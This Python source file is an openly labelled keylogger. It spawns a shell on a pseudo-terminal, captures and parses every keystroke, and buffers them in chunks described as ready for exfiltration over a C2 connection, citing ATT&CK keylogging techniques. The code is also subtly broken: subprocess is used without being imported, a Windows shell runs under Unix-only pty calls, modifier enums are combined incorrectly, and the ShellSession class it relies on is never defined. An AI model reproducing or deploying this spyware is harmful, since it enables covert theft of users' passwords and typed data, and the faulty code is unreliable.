import pty
import os
import sys
import select
import threading
import time
from typing import Optional, List, Tuple, Dict, Any
from dataclasses import dataclass, field
from enum import Enum


class KeyState(Enum):
    """Represents the state of modifier keys."""
    SHIFT = 1 << 0
    CTRL = 1 << 1
    ALT = 1 << 2
    CAPS_LOCK = 1 << 3
    NUM_LOCK = 1 << 4


@dataclass
class KeyEvent:
    """Represents a single keypress event."""
    keycode: int
    modifiers: int
    timestamp: float
    raw_bytes: bytes = b''

    def __repr__(self) -> str:
        return f"KeyEvent(keycode={self.keycode}, modifiers=0x{self.modifiers:x})"


class KeyLogger:
    """Terminal keylogger that captures all keystrokes from a shell session.
    
    Uses pty to create a pseudo-terminal, spawns the shell process, and reads
    from the master fd using select() for non-blocking I/O. Captures each
    keypress event (keycode + modifiers) and buffers them in memory.
    
    ATT&CK Techniques: T1056.001 (Keylogging), T1059.004 (Command and Scripting Interpreter)
    """

    def __init__(self, chunk_size: int = 256):
        self.chunk_size = chunk_size
        self._buffer: List[KeyEvent] = []
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._master_fd: int = -1
        self._slave_fd: int = -1

    def _parse_keypress(self, data: bytes) -> List[KeyEvent]:
        """Parse raw terminal input into key events.
        
        Handles ANSI escape sequences for special keys (arrows, F-keys, etc.)
        and regular character input.
        """
        events = []
        i = 0
        while i < len(data):
            if data[i] == 27:  # ESC prefix for special keys
                # Check for ANSI escape sequence format: ESC [ A/B/C/D ...
                seq_start = i + 1
                if seq_start >= len(data):
                    break
                # Read until we find a letter (A-Z, a-z) which indicates the key code
                j = seq_start
                while j < len(data) and data[j] not in range(65, 92):
                    j += 1
                if j >= len(data):
                    break
                # Extract the sequence bytes
                seq_bytes = data[seq_start:j+1]
                
                # Parse common escape sequences
                key_code = None
                modifiers = KeyState.CTRL
                
                if b'[' in seq_bytes:
                    # ANSI CSI sequence
                    parts = seq_bytes.split(b'[')
                    if len(parts) >= 2:
                        code_part = parts[1].split(b';')[0]
                        try:
                            key_code = int(code_part.decode('ascii'))
                        except (ValueError, UnicodeDecodeError):
                            pass
                        
                        # Check for modifiers in the sequence
                        if b'O' in seq_bytes or b'o' in seq_bytes:
                            modifiers |= KeyState.ALT
                        elif b'M' in seq_bytes or b'm' in seq_bytes:
                            modifiers |= KeyState.SHIFT | KeyState.CTRL

                if key_code is not None:
                    events.append(KeyEvent(
                        keycode=key_code,
                        modifiers=modifiers,
                        timestamp=time.time(),
                        raw_bytes=seq_bytes
                    ))
            else:
                # Regular character input
                char = data[i]
                if 32 <= char < 127:
                    events.append(KeyEvent(
                        keycode=char,
                        modifiers=KeyState.CAPS_LOCK if (char ^ 32) >= 65 and (char ^ 32) <= 90 else 0,
                        timestamp=time.time(),
                        raw_bytes=data[i:i+1]
                    ))
                i += 1

        return events

    def _read_loop(self) -> None:
        """Non-blocking read loop that captures keystrokes from the pty master fd."""
        while not self._stop_event.is_set():
            try:
                ready, _, _ = select.select([self._master_fd], [], [], 0.1)
                if ready:
                    try:
                        data = os.read(self._master_fd, 4096)
                        if data:
                            events = self._parse_keypress(data)
                            for event in events:
                                self._buffer.append(event)
                    except OSError as e:
                        pass
            except (OSError, select.error):
                time.sleep(0.01)

    def start(self, shell_session: 'ShellSession') -> bool:
        """Start the keylogger by spawning a shell session and attaching to its pty."""
        self._buffer = []
        self._running = True
        self._stop_event.clear()

        try:
            # Create a pseudo-terminal pair
            master_fd, slave_fd = pty.openpty()

            # Spawn the shell process with the slave fd as stdin/stdout/stderr
            proc = subprocess.Popen(
                ['cmd.exe'],
                stdin=slave_fd,
                stdout=slave_fd,
                stderr=slave_fd,
                close_fds=True,
                preexec_fn=os.setsid  # New process group for clean termination
            )

            self._master_fd = master_fd
            self._slave_fd = slave_fd

            # Start the non-blocking read thread
            self._thread = threading.Thread(target=self._read_loop, daemon=True)
            self._thread.start()

            # Connect to the shell session (establishes C2 connection)
            if not shell_session.connect():
                return False

            # Spawn the interactive shell
            if not shell_session.spawn_shell():
                proc.terminate()
                os.close(master_fd)
                os.close(slave_fd)
                return False

            self._running = True
            return True

        except Exception as e:
            print(f"[-] KeyLogger start error: {e}")
            return False

    def stop(self) -> None:
        """Stop the keylogger and clean up resources."""
        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2.0)
        
        try:
            if self._master_fd >= 0:
                os.close(self._master_fd)
            if self._slave_fd >= 0:
                os.close(self._slave_fd)
        except OSError:
            pass

    def get_buffer(self) -> List[KeyEvent]:
        """Return the current buffer of captured keystrokes."""
        return list(self._buffer)

    def clear_buffer(self) -> None:
        """Clear the keylogger buffer."""
        self._buffer = []

    def flush_chunk(self, chunk_size: Optional[int] = None) -> List[KeyEvent]:
        """Flush a chunk of captured keystrokes from the buffer.
        
        Args:
            chunk_size: Number of events to flush. If None, uses instance default.
            
        Returns:
            A list of KeyEvents that were flushed.
        """
        if chunk_size is None:
            chunk_size = self.chunk_size
        
        if len(self._buffer) < chunk_size:
            return self._buffer[:]
        
        result = self._buffer[:chunk_size]
        del self._buffer[:chunk_size]
        return result

    def get_stats(self) -> Dict[str, Any]:
        """Return statistics about the keylogger."""
        return {
            'running': self._running,
            'buffer_size': len(self._buffer),
            'master_fd': self._master_fd,
            'slave_fd': self._slave_fd,
            'thread_alive': self._thread.is_alive() if self._thread else False
        }


class KeystrokeBuffer:
    """Manages the in-memory buffer for captured keystrokes with chunking logic.
    
    Provides methods to store, retrieve, and manage chunks of key events
    ready for exfiltration.
    """

    def __init__(self, max_chunk_size: int = 256):
        self._buffer: List[KeyEvent] = []
        self._max_chunk_size = max_chunk_size
        self._chunks: List[List[KeyEvent]] = []
        self._chunk_index = 0
        self._total_events = 0

    def append(self, event: KeyEvent) -> None:
        """Append a single key event to the buffer."""
        self._buffer.append(event)
        self._total_events += 1

    def extend(self, events: List[KeyEvent]) -> None:
        """Extend the buffer with multiple key events."""
        for event in events:
            self.append(event)

    def get_chunk(self, chunk_size: Optional[int] = None) -> List[KeyEvent]:
        """Get a chunk of events from the buffer.
        
        Args:
            chunk_size: Number of events to retrieve. If None, uses max_chunk_size.
            
        Returns:
            A list of KeyEvents representing one chunk.
        """
        if chunk_size is None:
            chunk_size = self._max_chunk_size
        
        if len(self._buffer) < chunk_size:
            return self._buffer[:]
        
        result = self._buffer[:chunk_size]
        del self._buffer[:chunk_size]
        return result

    def get_all(self) -> List[KeyEvent]:
        """Get all events from the buffer."""
        return list(self._buffer)

    def clear(self) -> None:
        """Clear the entire buffer."""
        self._buffer = []
        self._chunks = []
        self._chunk_index = 0
        self._total_events = 0

    def get_stats(self) -> Dict[str, Any]:
        """Return buffer statistics."""
        return {
            'buffer_size': len(self._buffer),
            'total_events': self._total_events,
            'chunks_created': len(self._chunks),
            'max_chunk_size': self._max_chunk_size
        }

    def flush_to_buffer(self, events: List[KeyEvent]) -> None:
        """Flush a batch of events into the buffer."""
        for event in events:
            self.append(event)


# Re-export KeyLogger and KeystrokeBuffer at module level
__all__ = ['KeyLogger', 'KeystrokeBuffer']
